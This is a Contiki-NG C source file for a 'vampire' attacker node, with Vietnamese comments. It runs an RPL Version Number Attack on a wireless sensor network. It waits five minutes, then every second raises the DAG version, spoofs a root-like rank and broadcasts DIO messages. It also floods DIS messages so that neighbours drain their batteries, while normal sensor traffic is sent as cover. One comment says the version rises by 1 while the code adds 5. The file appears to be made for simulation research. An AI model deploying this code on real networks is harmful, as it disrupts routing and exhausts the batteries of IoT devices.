#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/energest.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "VAMPIRE"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Chu kỳ gửi dữ liệu bình thường */
#define NORMAL_SEND_INTERVAL (60 * CLOCK_SECOND)
/* Chu kỳ kích hoạt Version Number Attack */
#define VNA_ATTACK_INTERVAL  (1 * CLOCK_SECOND)

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

#define STATUS_INTERVAL   (5 * CLOCK_SECOND)
#define INITIAL_ENERGY_MJ 15000
#define VOLTAGE_V        3.0
#define CURRENT_TX_MA    17.4
#define CURRENT_RX_MA    20.0
#define CURRENT_CPU_MA    1.8
#define CURRENT_LPM_MA    0.0545

static uint32_t residual_mj = INITIAL_ENERGY_MJ;
static uint32_t last_cpu, last_lpm, last_tx, last_rx;
static uint32_t sim_start_time;
static uint8_t node_is_dead = 0;

static double
energy_tick_and_get_duty(void)
{
  if(node_is_dead) {
    return 0.0;
  }

  uint32_t cpu = energest_type_time(ENERGEST_TYPE_CPU) - last_cpu;
  uint32_t lpm = energest_type_time(ENERGEST_TYPE_LPM) - last_lpm;
  uint32_t tx  = energest_type_time(ENERGEST_TYPE_TRANSMIT) - last_tx;
  uint32_t rx  = energest_type_time(ENERGEST_TYPE_LISTEN) - last_rx;
  last_cpu += cpu; last_lpm += lpm; last_tx += tx; last_rx += rx;

  double t_cpu = (double)cpu / ENERGEST_SECOND;
  double t_lpm = (double)lpm / ENERGEST_SECOND;
  double t_tx  = (double)tx  / ENERGEST_SECOND;
  double t_rx  = (double)rx  / ENERGEST_SECOND;

  double consumed_mj = VOLTAGE_V * (CURRENT_CPU_MA * t_cpu + CURRENT_LPM_MA * t_lpm
                                    + CURRENT_TX_MA  * t_tx  + CURRENT_RX_MA  * t_rx);
  
  if(consumed_mj >= (double)residual_mj) {
    residual_mj = 0;
  } else {
    residual_mj -= (uint32_t)consumed_mj;
  }

  double elapsed_radio_on_s = t_tx + t_rx;
  double elapsed_total_s = t_cpu + t_lpm;
  return elapsed_total_s > 0 ? (elapsed_radio_on_s / elapsed_total_s) * 100.0 : 0.0;
}

PROCESS(vampire_process, "Vampire Attacker Node");
PROCESS(status_process, "Status reporter");
AUTOSTART_PROCESSES(&vampire_process, &status_process);

PROCESS_THREAD(vampire_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer attack_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  
  PROCESS_BEGIN();
  sim_start_time = clock_time();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("Vampire Node started - Target: Version Number Attack\n");
  
  /* Bắt đầu chu kỳ gửi gói tin data bình thường để che giấu hành vi */
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  /* Bắt đầu chu kỳ phát tán VNA */
  /* Cho mang on dinh 5 phut roi moi bat dau tan cong de 50 node ket noi xong */
  etimer_set(&attack_timer, 5UL * 60 * CLOCK_SECOND);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* Xử lý phát tán Version Number Attack */
    if(ev == PROCESS_EVENT_TIMER && data == &attack_timer) {
        
        /* Chỉ tấn công nếu node đã tham gia vào mạng RPL (có instance hợp lệ) */
        if(curr_instance.used) {
            /* 1. Tăng version number lên +1 thay vì +10. Nhiều hệ thống bảo mật RPL sẽ drop gói tin nếu version nhảy vọt quá lớn. +1 giúp DIO trông có vẻ hợp lệ hơn. */
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += 5;
            
            /* 2. Giả mạo Rank thành giá trị cực tốt (như Root - 256). Nếu Rank của attacker quá tệ (ví dụ node ở xa), các node khác có thể bỏ qua version update từ nó. */
            curr_instance.dag.rank = 256;
            
            LOG_INFO("ATTACK_VNA_UPGRADED: Triggered! Version changed %u -> %u. Broadcasting DIO & DIS...\n", 
                     old_version, curr_instance.dag.version);
            
            /* 3. Ép hệ điều hành phát ra gói tin DIO mang Version mới và Rank giả mạo tới tất cả lân cận */
            rpl_icmp6_dio_output(NULL);

            /* 4. Tấn công DIS Flooding: Gửi Multicast DIS để ép các node lân cận reset Trickle timer về I_min và đồng loạt xả DIO, gây tốn pin cực nhanh */
            rpl_icmp6_dis_output(NULL);
        } else {
            LOG_INFO("ATTACK_VNA: Not joined RPL DAG yet, waiting...\n");
        }

        etimer_set(&attack_timer, VNA_ATTACK_INTERVAL);
    }

    /* Xử lý gửi gói dữ liệu cảm biến bình thường */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        
        uint8_t root_id = dest_ipaddr.u8[15];
        if(root_id == 1) p.cluster_id = 1;
        else if(root_id == 27 || root_id == 0x1b) p.cluster_id = 2;
        else p.cluster_id = 0;
        
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = residual_mj;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_INFO("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}

PROCESS_THREAD(status_process, ev, data)
{
  static struct etimer et;
  PROCESS_BEGIN();
  
  while(1) {
    etimer_set(&et, STATUS_INTERVAL);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

    if(node_is_dead) {
      LOG_INFO("STATUS node=%u STOPPED\n", node_id);
      PROCESS_EXIT();
    }

    double duty = energy_tick_and_get_duty();
    uint16_t rank = curr_instance.dag.rank;
    LOG_INFO("STATUS node=%u energy_mj=%lu duty_pct=%d rank=%u\n",
             node_id, (unsigned long)residual_mj, (int)duty, rank);
  }
  PROCESS_END();
}



